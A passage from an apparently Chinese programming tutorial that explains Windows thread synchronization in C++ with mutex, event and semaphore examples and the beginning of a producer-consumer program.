class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了以上两个概念后，我们看其他3个机制</p><h4 id="互斥体解决互斥问题："><a href="#互斥体解决互斥问题：" class="headerlink" title="互斥体解决互斥问题："></a>互斥体解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseMutex</p><p> 互斥体也具有线程所有权的概念，得到互斥体的线程，需要自己去释放互斥体。谁加锁，谁开锁。如果得到互斥体的线程崩溃了，互斥体会立即变为激发态。所有等待互斥体的线程中会立即有线程得到互斥体。不会造成死锁的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hMutex = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hMutex = <span class="built_in">CreateMutex</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,<span class="comment">//创建的线程，是不是第一个拥有者</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件解决互斥问题："><a href="#事件解决互斥问题：" class="headerlink" title="事件解决互斥问题："></a>事件解决互斥问题：</h4><p>需要是自动模式的事件</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> SetEvent</p><p> 事件，没有线程所有权的概念，任何线程都可以释放事件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">TRUE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件决定顺序"><a href="#事件决定顺序" class="headerlink" title="事件决定顺序"></a>事件决定顺序</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WifeProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始做饭吧&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">HusProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始吃饭吧&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">FALSE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WifeProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, HusProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号量："><a href="#信号量：" class="headerlink" title="信号量："></a>信号量：</h4><p> 有信号数这么一个概念，只要信号数不为0，那么就处于激发态。WaitForSignaleObject函数对它的副作用是将信号数减1。</p><p> 最大信号数为1 的信号量，可以认为是一个事件，可以解决互斥问题。</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseSemaphore</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lInitialCount,                          <span class="comment">// initial count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lMaximumCount,                          <span class="comment">// maximum count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                           <span class="comment">// object name</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">此函数可用来创建或打开一个信号量，先看参数说明：</span></span><br><span class="line"><span class="function"> lpSemaphoreAttributes：为信号量的属性，一般可以设置为<span class="literal">NULL</span></span></span><br><span class="line"><span class="function"> lInitialCount：信号量初始值，必须大于等于0，而且小于等于 lpMaximumCount，如果lInitialCount 的初始值为0，则该信号量默认为unsignal状态，如果lInitialCount的初始值大于0，则该信号量默认为signal状态，</span></span><br><span class="line"><span class="function"> lMaximumCount： 此值为设置信号量的最大值，必须大于0</span></span><br><span class="line"><span class="function">lpName：信号量的名字，长度不能超出MAX_PATH ，可设置为<span class="literal">NULL</span>，表示无名的信号量。当lpName不为空时，可创建有名的信号量，若当前信号量名与已存在的信号量的名字相同时，则该函数表示打开该信号量，这时参数lInitialCount 和 </span></span><br><span class="line"><span class="function">lMaximumCount 将被忽略。</span></span><br><span class="line"><span class="function">    函数调用成功返回信号量句柄。</span></span><br><span class="line"><span class="function">释放信号量函数：</span></span><br></pre></td></tr></table></figure><p>b. 对于共享资源有序的访问，也可以更关注于要有序。</p><p> 事件和信号量更适合解决有序的问题。因为他们不要求谁上锁，谁开锁。</p><p>用代码实现一个读文件线程，一个写文件线程，请实现先写后读，两个线程都结束之后，主线程结束。</p><p>这种没有过多线程同时访问的有顺序的问题，比较适合用事件来解决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hSemaphore = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">g_hSemaphore = <span class="built_in">CreateSemaphore</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多个信号数的信号量，比较适合解决多个线程之间有顺序需要协调的问题，最为经典的就是生产者消费者问题。</p><p>关键点有两个：</p><p> 1 必须有一个队列，可以有数量限制，也可以没有数量限制。我们考虑的是有数量限制的问题</p><p> 2 每一个生产者是一个线程，每一个消费者也是一个线程。队列满了，生产者需要等待。队列空了，消费者需要等待。</p><p>整个的问题是多线程并发时的协调问题。</p><p>生产者消费者问题，有两个操作</p><p>P：生产</p><p>V：消耗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">HANDLE hSemaphoreFull = <span class="number">0</span>;</span><br><span class="line">HANDLE hSemaphoreEmpty = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutexNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> g_nNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">class</span> 盖饭</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    盖饭(<span class="type">const</span> <span class="type">char</span> *szName, <span class="type">int</span> nNum) :<span class="built_in">m_Id</span>(nNum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nSize = <span class="built_in">strlen</span>(szName) + <span class="number">1</span>;</span><br><span class="line">        m_szName = <span class="keyword">new</span> <span class="type">char</span>[nSize];</span><br><span class="line">        <span class="built_in">memset</span>(m_szName, <span class="number">0</span>, nSize);</span><br><span class="line">        <span class="built_in">strcpy_s</span>(m_szName, nSize, szName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_Id;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> * m_szName;</span><br><span class="line">    <span class="type">int</span> m_Id;</span><br><span class="line">&#125;;</span><br><span class="line">std::vector&lt;盖饭*&gt; g_盖饭表;</span><br><span class="line"><span class="type">int</span> Continue = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//生产者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Creater</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者开始做饭,预计%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, nTime);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutexNum, <span class="number">-1</span>);</span><br><span class="line">        g_nNum++;</span><br><span class="line">        盖饭* p = <span class="keyword">new</span> 盖饭(<span class="string">&quot;鱼香肉丝&quot;</span>, g_nNum);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutexNum);</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者传菜,菜号为%d\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, p-&gt;<span class="built_in">GetId</span>());</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreEmpty, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        g_盖饭表.<span class="built_in">push_back</span>(p);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreFull, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//消费者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">User</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreFull, <span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;                              %d号消费者取走了%d号饭,耗时%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, g_盖饭表[<span class="number">0</span>]-&gt;<span class="built_in">GetId</span>(), nTime);</span><br><span class="line">        g_盖饭表.<span class="built_in">erase</span>(g_盖饭表.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreEmpty, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hSemaphoreFull = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hSemaphoreEmpty = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    hMutexNum = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//9个生产者</span></span><br><span class="line">    hThread[<span class="number">0</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">2</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">3</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">4</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">5</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">6</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">7</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">8</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">9</span>, <span class="number">0</span>, <span 